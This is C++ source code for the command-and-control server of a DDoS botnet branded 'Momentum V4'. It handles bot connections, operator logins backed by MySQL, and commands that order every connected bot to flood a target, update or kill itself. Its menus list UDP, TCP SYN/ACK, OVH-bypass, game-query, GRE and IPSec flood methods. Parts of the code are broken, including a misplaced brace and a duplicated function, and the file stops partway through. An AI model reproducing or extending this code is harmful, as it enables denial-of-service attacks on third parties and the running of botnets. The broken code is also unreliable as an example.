#include <iostream>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <thread>
#include <map>
#include <sstream>
#include <string>
#include <unistd.h>
#include <sys/epoll.h>
#include <errno.h>
#include <string.h>
#include <vector>
#include <iterator>
#include <sys/time.h>
#include <ctime>
#include <chrono>


#include "headers/main.h"
#include "headers/client.h"
#include "headers/mysql.h"
#include "headers/command.h"
#include "headers/thread.h"

static volatile int ConnectedUser = 0;
static int AttackingBool = 1;


static void terminate_client(int fd)
{
    epoll_ctl(efd, EPOLL_CTL_DEL, client_list[fd].fd, NULL);

    if(client_list[fd].fd != -1)
        close(client_list[fd].fd);

    client_list[fd].fd = -1;
    client_list[fd].connected = FALSE;
    client_list[fd].addr = 0;
    client_list[fd].authenticated = FALSE;
    client_list[fd].timeout = 0;
    client_list[fd].arch_len = 0;
    memset(client_list[fd].arch, 0, sizeof(client_list[fd].arch));

    return;
}

static void _exit(const char *str, int exit_code)
{
    std::cout << str << std::endl;
    exit(exit_code);
}

static void admin_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    admin_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!admin_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ADMIN_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(admin_fd);
    REUSE_ADDR(admin_fd);

    ret = bind(admin_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the admin port", 1);
    }

    ret = listen(admin_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the admin port", 1);
    }

    return;
}

static void delete_dup(int fd)
{

    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_KILL;
    send(fd, &data, sizeof(data), MSG_NOSIGNAL);
    return;
}

        std::string timeToString(std::chrono::system_clock::time_point &t)
        {
            std::time_t time = std::chrono::system_clock::to_time_t(t);
            std::string time_str = std::ctime(&time);
            time_str.resize(time_str.size() - 1);
            return time_str;
        }

static void accept_client_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    struct epoll_event e;
    int ret = 0;
    //int x = 0;
    //BOOL d = FALSE;

    //cout << "Accepting connection..." << endl;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    


    e.data.fd = fd;
    e.events = EPOLLIN | EPOLLET;

    ret = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &e);
    if(ret)
    {
        return;
    }

    // Slot the client into the list
    client_list[e.data.fd].fd = e.data.fd;
    client_list[e.data.fd].connected = TRUE;
    client_list[e.data.fd].addr = addr.sin_addr.s_addr;
    client_list[e.data.fd].authenticated = FALSE;
    client_list[e.data.fd].timeout = time(NULL);
    client_list[e.data.fd].arch_len = 0;
    memset(client_list[e.data.fd].arch, 0, sizeof(client_list[e.data.fd].arch));

    //printf("\e[32;1mJoined bots > [\e[37;1m%d.%d.%d.%d\e[32;1m] \t|\t \e[32;1mNode ID > [\e[37;1m%d\e[32;1m]\n",client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff, client_list[e.data.fd].fd);

    //cout << "Added the fd!" << endl;

    return;
    }
}

static void trim(char *str)
{
    int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
        begin++;

    while ((end >= begin) && isspace(str[end]))
        end--;

    for (i = begin; i <= end; i++)
        str[i - begin] = str[i];

    str[i - begin] = '\0';
}

static int parse_count(struct process *process)
{
    int count = 0;
    int x = 0;
    std::stringstream stream;
    std::string out;
    std::string n;

    stream << process->buf;

    std::getline(stream, out, ' ');
    n = out;

    process->f = process->buf;
    process->f.erase(0, n.length() + 1);

    n.erase(0, 1);

    count = stoi(n);

    if(count == 0 || (process->ptr->max_clients == -1 && count == -1) || (process->ptr->max_clients != -1 && count > process->ptr->max_clients))
        return 0;

    process->count = count;
    return 1;
}

static void flood(struct command *ptr, struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;

    data.type = TYPE_FLOOD;

    memset(data.buf, 0, sizeof(data.buf));

    memcpy(data.buf, ptr->buf, ptr->buf_len);

    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
            continue;
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
            break;
    }

    return;
}

static std::map<std::string, int> statistics(void)
{
    int i = 0;
    std::map<std::string, int> t;

    for(i = 0; i < MAX_BOTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        t[client_list[i].arch]++;
    }

    return t;
}

int client_count(int max_clients)
{
    int i = 0;
    int x = 0;

    for(i = 0; i < MAX_BOTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        if(max_clients != -1 && x == max_clients)
            break;
        x++;
    }

    return x;
}

void *basic(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;

    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);

        title << "\033]0;";
        title << "" << client_count(p.max_clients) <<" Bots | " << ConnectedUser <<" Users";
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
        sleep(1);
    }
}

void *title_counter(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;

    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);

        title << "\033]0;";
        title << "Momentum | Devices - " << client_count(p.max_clients);
        title << " | Active users - " << ConnectedUser;
        title << " | Logged as - "<< p.username;
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
        sleep(1);
    }
}

static std::tuple<int, std::string> recv_line(int fd)
{
    int ret = 0;
    std::string str;

    while(1)
    {
        int np = 0;
        int rp = 0;
        char out[4096];

        memset(out, 0, sizeof(out));

        ret = recv(fd, out, sizeof(out), MSG_NOSIGNAL);
        if(ret <= 0)
        {
            return std::tuple<int, std::string>(ret, str);
        }

        str = out;

        np = str.find("\n");
        rp = str.find("\r");

        if(np != -1)
        {
            str.erase(np);
        }

        if(rp != -1)
        {
            str.erase(rp);
        }

        if(str.length() == 0)
        {
            continue;
        }

        break;
    }

    return std::tuple<int, std::string>(ret, str);
}

        static std::string timeToString(std::chrono::system_clock::time_point &t)
        {
            std::time_t time = std::chrono::system_clock::to_time_t(t);
            std::string time_str = std::ctime(&time);
            time_str.resize(time_str.size() - 1);
            return time_str;
        }

static void *admin_timeout_thread(void *arg)
{
    struct thread_data *tdata = (struct thread_data *)arg;

    pthread_barrier_wait(tdata->barrier);

    while(TRUE)
    {
        if(tdata->time + tdata->timeout < time(NULL))
        {
            close(tdata->fd);
            pthread_cancel(*tdata->admin_thread);
            break;
        }
        sleep(1);
    }

    pthread_exit(0);
}

static void kill_self(struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_KILL;
    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}


static void update_bots(struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_UPDATE;
    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}



static void *admin(void *arg)
{
    int fd = -1;
    std::stringstream stream;
    pthread_t counter;
    char user[4096];
    char pass[4096];
    char banner1[1024];
    char banner2[1024];
    char banner3[1024];
    char banner4[1024];
    char banner5[1024];
    char banner6[1024];
    char banner7[1024];
    struct admin login;
    int ffd = -1;
    char bbuf[4096];
    int load = 0;
    struct thread_data *tdata = (struct thread_data *)arg;
    struct thread_data t;
    pthread_barrier_t barrier;
    pthread_t admin_timeout;
    int ex = 0;
    int ret = 0;
    std::string banner;
    int np = 0;
    int rp = 0;
    std::tuple<int, std::string> line;

    pthread_barrier_wait(tdata->barrier);

    fd = tdata->fd;

    pthread_barrier_init(&barrier, NULL, 1);

    t.fd = fd;
    t.time = time(NULL);
    t.barrier = &barrier;
    t.admin_thread = tdata->admin_thread;
    t.timeout = 60;

    pthread_create(&admin_timeout, NULL, admin_timeout_thread, (void *)&t);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    ffd = open("motd.txt", O_RDONLY);
     if(ffd == -1)
        {
            std::cout << "Failed to open the motd file!" << std::endl;
            close(fd);
            pthread_cancel(admin_timeout);
            pthread_exit(0);
        }


    line = recv_line(fd);

    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);

    ret = read(ffd, bbuf, sizeof(bbuf));
    banner = bbuf;

    np = banner.find("\n");
    rp = banner.find("\r");

    if(np != -1)
    {
        banner.erase(np);
    }

    if(rp != -1)
    {
        banner.erase(rp);
    }

    if(strcmp(std::get<std::string>(line).c_str(), MANAGER_AUTH_KEY))
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }
    send(fd, "                                                                 \e[31;1m#####\r\n", strlen("                                                                 \e[31;1m#####\r\n"), MSG_NOSIGNAL);
    send(fd, "                                                                \e[31;1m#######\r\n", strlen("                                                                \e[31;1m#######\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m                   #                                            \e[31;1m##\e[37;1mO\e[31;1m#\e[37;1mO\e[31;1m##\r\n", strlen("\e[36;1m                   #                                            \e[31;1m##\e[37;1mO\e[31;1m#\e[37;1mO\e[31;1m##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m  ######          ###                                           \e[31;1m#\e[37;1mVVVVV\e[31;1m#\r\n", strlen("\e[36;1m  ######          ###                                           \e[31;1m#\e[37;1mVVVVV\e[31;1m#\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##             #                                          \e[31;1m##  \e[37;1mVVV  \e[31;1m##\r\n", strlen("\e[36;1m    ##             #                                          \e[31;1m##  \e[37;1mVVV  \e[31;1m##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##         ###    ### ####   ###    ###  ##### #####     \e[31;1m#          ##\r\n", strlen("\e[36;1m    ##         ###    ### ####   ###    ###  ##### #####     \e[31;1m#          ##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##        #  ##    ###    ##  ##     ##    ##   ##      \e[31;1m#            ##\r\n", strlen("\e[36;1m    ##        #  ##    ###    ##  ##     ##    ##   ##      \e[31;1m#            ##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##       #   ##    ##     ##  ##     ##      ###        \e[31;1m#            ###\r\n", strlen("\e[36;1m    ##       #   ##    ##     ##  ##     ##      ###        \e[31;1m#            ###\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##          ###    ##     ##  ##     ##      ###       \e[31;1mQQ#           ##Q\r\n", strlen("\e[36;1m    ##          ###    ##     ##  ##     ##      ###       \e[31;1mQQ#           ##Q\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##       # ###     ##     ##  ##     ##     ## ##    \e[31;1mQQQQQQ#       #QQQQQQ\r\n", strlen("\e[36;1m    ##       # ###     ##     ##  ##     ##     ## ##    \e[31;1mQQQQQQ#       #QQQQQQ\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##      ## ### #   ##     ##  ###   ###    ##   ##   \e[31;1mQQQQQQQ#     #QQQQQQQ\r\n", strlen("\e[36;1m    ##      ## ### #   ##     ##  ###   ###    ##   ##   \e[31;1mQQQQQQQ#     #QQQQQQQ\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m  ############  ###   ####   ####   #### ### ##### #####   \e[31;1mQQQQQ#######QQQQQ\r\n\r\n", strlen("\e[36;1m  ############  ###   ####   ####   #### ### ##### #####   \e[31;1mQQQQQ#######QQQQQ\r\n\r\n"), MSG_NOSIGNAL);

    send(fd, "\e[37;1mUsername\e[1;34m:\e[97m ", strlen("\e[37;1mUsername\e[1;34m:\e[97m "), MSG_NOSIGNAL);

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(user, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    send(fd, "\e[37;1mPassword\e[1;34m:\e[97m ", strlen("\e[37;1mPassword\e[1;34m:\e[97m "), MSG_NOSIGNAL);


    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(pass, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    login.user_ptr = user;
    login.pass_ptr = pass;

    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);

    send(fd, "\e[37mAuth", strlen("\e[37mAuth"), MSG_NOSIGNAL);
    for(load = 0; load < 3; load++)
    {
        send(fd, "\e[1;34m.\e[0m", strlen("\e[1;34m.\e[0m"), MSG_NOSIGNAL);
        sleep(1);
    }

    if(!mysql_login(&login))
    {
        send(fd, "\r\n\e[91mAdios!\e[0m\r\n", strlen("\r\n\e[91mAdios!\e[0m\r\n"), MSG_NOSIGNAL);
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

      if(AttackingBool == 0)
        {
      send(fd, "\033[2J\033[H                   Successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n", strlen("\033[2J\033[H                   Successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                         \e[31m* \e[93mWelcome into Momentum V4\e[31m *\e[0m\r\n", strlen("                         \e[31m* \e[93mWelcome into Momentum V4\e[31m *\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                         \e[93mType 'help' for display menu \e[31m!\e[0m\r\n", strlen("                         \e[93mType 'help' for display menu \e[31m!\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                    \e[93mAttacking gouvernemental website = \e[31mBAN !\e[0m\r\n", strlen("                    \e[93mAttacking gouvernemental website = \e[31mBAN !\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                             \e[93mAttacks Status: \e[32mDisabled\r\n", strlen("                             \e[93mAttacks Status: \e[32mEnabled\r\n\r\n"), MSG_NOSIGNAL);
        } 

      if(AttackingBool == 1)
        {
      send(fd, "\033[2J\033[H                   Successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n", strlen("\033[2J\033[H                   Successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                         \e[31m* \e[93mWelcome into Momentum V4\e[31m *\e[0m\r\n", strlen("                         \e[31m* \e[93mWelcome into Momentum V4\e[31m *\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                         \e[93mType 'help' for display menu \e[31m!\e[0m\r\n", strlen("                         \e[93mType 'help' for display menu \e[31m!\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                    \e[93mAttacking gouvernemental website = \e[31mBAN !\e[0m\r\n", strlen("                    \e[93mAttacking gouvernemental website = \e[31mBAN !\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      send(fd, "                             \e[93mAttacks Status: \e[32mEnabled\r\n", strlen("                             \e[93mAttacks Status: \e[32mEnabled\r\n\r\n"), MSG_NOSIGNAL);
        } 

    ConnectedUser++;
    pthread_cancel(admin_timeout);

    login.fd = fd;

    mysql_set_restrictions(&login);

    mysql_update_login(&login, 1);

    // User has been disabled for a indefinite amount of time
    if(login.disable)
    {
        send(fd, "\e[93mUser has been disabled\e[36;1m!\e[0m\r\n", 39, MSG_NOSIGNAL);
        close(fd);
        pthread_exit(0);
    }

    if(login.admin == 1){
        stream << "\r\e[94m"<< login.username <<"\e[97m@\e[94mbotnet:-|admin\e[1;91m#\e[0m ";
    }
    if(login.admin == 0){
        stream << "\r\e[94m"<< login.username <<"\e[97m@\e[94mbotnet:-|client\e[1;91m#\e[0m ";
    }
    // Spawn a thread to update a active title counter
    pthread_create(&counter, NULL, title_counter, (void *)&login);

    while(TRUE)
    {
        char buf[4096];
        struct process process;
        struct command *ptr;
        int x = 0;
        std::string data;
        int g = 0;
        int count = 0;
        int cooldown = 0;
        int concurrent_user = 0;
        int maxclikos = 0;
        int time_boot = 0;
        int np = 0;
        int rp = 0;

        memset(buf, 0, sizeof(buf));

        // Send the admin a fake prompt for user input
        ret = send(fd, stream.str().c_str(), stream.str().length(), MSG_NOSIGNAL);

        if(ret <= 0)
        {
            break;
        }

        g = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);

        if(g <= 0)
        {
            break;
        }

        data = buf;

        np = data.find("\n");
        rp = data.find("\r");

        if(np != -1)
        {
            data.erase(np);
        }

        if(rp != -1)
        {
            data.erase(rp);
        }

        if(data == "")
        {
            continue;
        }

        mysql_set_restrictions(&login);

        count = client_count(login.max_clients);
        concurrent_user = login.concurrent;
        cooldown = login.cooldown;
        maxclikos = login.max_clients;
        time_boot = login.max_time;

        if(login.disable)
        {
            send(fd, "\e[93mUser has been disabled\e[36;1m!\e[0m\r\n", 39, MSG_NOSIGNAL);
            break;
        }


if(data == "title"){
    pthread_cancel(counter);
    pthread_create(&counter, NULL, basic, (void *)&login);
    continue;
}

        if(data == "methods" && login.admin == 1)
        {
            send(fd, "\033[2J\033[H                                  \e[37mRank: \e[36;1mAdmin\r\n\r\n", strlen("\033[2J\033[H                                  \e[37mRank: \e[36;1mAdmin\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\r\n\e[36;1m!udp\e[37;1m: Basic UDP flood optimized for high GBPS.\r\n", strlen("\r\n\e[36;1m!udp\e[37;1m: Basic UDP flood optimized for high GBPS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!udpbypass\e[37;1m: UDP flood customized for bypassing rules.\r\n", strlen("\e[36;1m!udpbypass\e[37;1m: UDP flood customized for bypassing rules.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!udpplain\e[37;1m: UDP optimized for high PPS.\r\n\r\n", strlen("\e[36;1m!udpplain\e[37;1m: UDP optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpack\e[37;1m: ACK optimized for high GBPS.\r\n", strlen("\e[36;1m!tcpack\e[37;1m: ACK optimized for high GBPS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpsyn\e[37;1m: SYN optimized for high GBPS.\r\n", strlen("\e[36;1m!tcpsyn\e[37;1m: SYN optimized for high GBPS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpovh\e[37;1m: SYN-ACK optimized for bypass OVH header (+ TCP OPT).\r\n", strlen("\e[36;1m!tcpovh\e[37;1m: SYN-ACK optimized for bypass OVH header (+ TCP OPT).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!ackplain\e[37;1m: ACK optimized for high PPS.\r\n\r\n", strlen("\e[36;1m!ackplain\e[37;1m: ACK optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!vsebypass\e[37;1m: VSE multiple Payload GAME query flooding.\r\n", strlen("\e[36;1m!vsebypass\e[37;1m: VSE multiple Payload GAME query flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!udpfivem\e[37;1m: UDP-Game Fivem A2S-player query flooding.\r\n", strlen("\e[36;1m!udpfivem\e[37;1m: UDP-Game Fivem A2S-player query flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!hex\e[37;1m: UDP-Hex randomized encrypted payload-string.\r\n", strlen("\e[36;1m!hex\e[37;1m: UDP-Hex randomized encrypted payload-string.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!protocol\e[37;1m: Special random layer protocol flooding.\r\n", strlen("\e[36;1m!protocol\e[37;1m: Special random layer protocol flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpconn\e[37;1m: TCP-CONN flood cookie spam session.\r\n", strlen("\e[36;1m!tcpconn\e[37;1m: TCP-CONN flood cookie spam session.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpmix\e[37;1m: SYN-ACK Mixed flood optimized for high PPS.\r\n\r\n", strlen("\e[36;1m!tcpmix\e[37;1m: SYN-ACK Mixed flood optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!ipsec\e[37;1m: ESP/IPSec Layer3 Special Flooding.\r\n", strlen("\e[36;1m!ipsec\e[37;1m: ESP/IPSec Layer3 Special Flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!ethernet\e[37;1m: UDP-GRE Layer3 Special flooding.\r\n\r\n", strlen("\e[36;1m!ethernet\e[37;1m: UDP-GRE Layer3 Special flooding.\r\n\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "methods" && login.admin == 0)
        {
            send(fd, "\033[2J\033[H                                  \e[37mRank: \e[36;1mClient\r\n\r\n", strlen("\033[2J\033[H                                  \e[37mRank: \e[36;1mClient\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\r\n\e[36;1m!udp\e[37;1m: Basic UDP flood optimized for high GBPS.\r\n", strlen("\r\n\e[36;1m!udp\e[37;1m: Basic UDP flood optimized for high GBPS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!udpbypass\e[37;1m: UDP flood customized for bypassing rules.\r\n", strlen("\e[36;1m!udpbypass\e[37;1m: UDP flood customized for bypassing rules.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!udpplain\e[37;1m: UDP optimized for high PPS.\r\n\r\n", strlen("\e[36;1m!udpplain\e[37;1m: UDP optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpack\e[37;1m: ACK optimized for high GBPS.\r\n", strlen("\e[36;1m!tcpack\e[37;1m: ACK optimized for high GBPS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpsyn\e[37;1m: SYN optimized for high GBPS.\r\n", strlen("\e[36;1m!tcpsyn\e[37;1m: SYN optimized for high GBPS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpovh\e[37;1m: SYN-ACK optimized for bypass OVH header (+ TCP OPT).\r\n", strlen("\e[36;1m!tcpovh\e[37;1m: SYN-ACK optimized for bypass OVH header (+ TCP OPT).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!ackplain\e[37;1m: ACK optimized for high PPS.\r\n\r\n", strlen("\e[36;1m!ackplain\e[37;1m: ACK optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!vsebypass\e[37;1m: VSE multiple Payload GAME query flooding.\r\n", strlen("\e[36;1m!vsebypass\e[37;1m: VSE multiple Payload GAME query flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!udpfivem\e[37;1m: UDP-Game Fivem A2S-player query flooding.\r\n", strlen("\e[36;1m!udpfivem\e[37;1m: UDP-Game Fivem A2S-player query flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!hex\e[37;1m: UDP-Hex randomized encrypted payload-string.\r\n", strlen("\e[36;1m!hex\e[37;1m: UDP-Hex randomized encrypted payload-string.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!protocol\e[37;1m: Special random layer protocol flooding.\r\n", strlen("\e[36;1m!protocol\e[37;1m: Special random layer protocol flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpconn\e[37;1m: TCP-CONN flood cookie spam session.\r\n", strlen("\e[36;1m!tcpconn\e[37;1m: TCP-CONN flood cookie spam session.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!tcpmix\e[37;1m: SYN-ACK Mixed flood optimized for high PPS.\r\n\r\n", strlen("\e[36;1m!tcpmix\e[37;1m: SYN-ACK Mixed flood optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!ipsec\e[37;1m: ESP/IPSec Layer3 Special Flooding.\r\n", strlen("\e[36;1m!ipsec\e[37;1m: ESP/IPSec Layer3 Special Flooding.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1m!ethernet\e[37;1m: UDP-GRE Layer3 Special flooding.\r\n\r\n", strlen("\e[36;1m!ethernet\e[37;1m: UDP-GRE Layer3 Special flooding.\r\n\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "help")
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);

  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");


    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[94m-\e[97mHelp Menu\e[94m-\r\n", strlen("\e[94m-\e[97mHelp Menu\e[94m-\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[94mmy statistics\e[94m:\e[37m Check your account informations.\r\n", 67, MSG_NOSIGNAL);
            send(fd, "   \e[94mbots\e[94m:\e[37m Bots connected on the network.\r\n", 56, MSG_NOSIGNAL);
            send(fd, "   \e[94mbots arch\e[94m:\e[37m Bots architecture.\r\n", 49, MSG_NOSIGNAL);
            send(fd, "   \e[94mmethods\e[94m:\e[37m Methods list.\r\n", 42, MSG_NOSIGNAL);
            send(fd, "   \e[94mclear\e[94m:\e[37m Clear the screen.\r\n", 44, MSG_NOSIGNAL);
            send(fd, "   \e[94mmotd\e[94m:\e[37m See the message of the day updated by admin.\r\n", strlen("   \e[94mmotd\e[94m:\e[37m See the message of the day updated by admin.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[94mquit\e[94m:\e[37m Leave the network.\r\n", 44, MSG_NOSIGNAL);
            if(login.admin == 1){
                send(fd, "\r\n\e[94m-\e[97mAdmin Options\e[94m-\r\n", strlen("\r\n\e[94m-\e[97mAdmin Options\e[94m-\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[94mattacks <enable/disable>\e[94m:\e[37m Enable/disable attacks on the network.\r\n", strlen("   \e[94mattacks <enable/disable>\e[94m:\e[37m Enable/disable attacks on the network.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[94mupdate\e[94m:\e[37m Update the bots with new bins.\r\n", strlen("   \e[94mupdate\e[94m:\e[37m Update the bots with new bins.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[94mbotkill\e[94m:\e[37m Kill all bots currently connected.\r\n\r\n", strlen("   \e[94mbotkill\e[94m:\e[37m Kill all bots currently connected.\r\n\r\n"), MSG_NOSIGNAL);

            }
            continue;
        }

        if((data == "my statistics") && login.admin == 0)
        {

            std::stringstream mystats_stream;
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
